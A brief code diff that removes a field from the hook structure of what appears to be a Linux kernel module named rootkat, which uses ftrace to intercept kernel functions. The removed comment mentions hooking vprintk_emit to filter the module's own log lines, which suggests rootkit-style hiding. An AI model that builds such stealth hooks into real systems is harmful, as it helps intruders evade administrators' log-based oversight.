@@ -32,12 +32,6 @@ struct rootkat_hook {
 	void *replacement;               /* called instead of target */
 	void *original;                  /* set by install: call this to defer */
 	unsigned long target;            /* resolved address; 0 = not installed */
-	bool intercept_own_calls;        /* if true, skip the within_module
-	                                  * recursion guard — replacement runs
-	                                  * even when the caller is rootkat.ko
-	                                  * itself. Required for the vprintk_emit
-	                                  * hook (whose whole point is filtering
-	                                  * our own pr_info lines). */
 	struct ftrace_ops ops;
 };
 
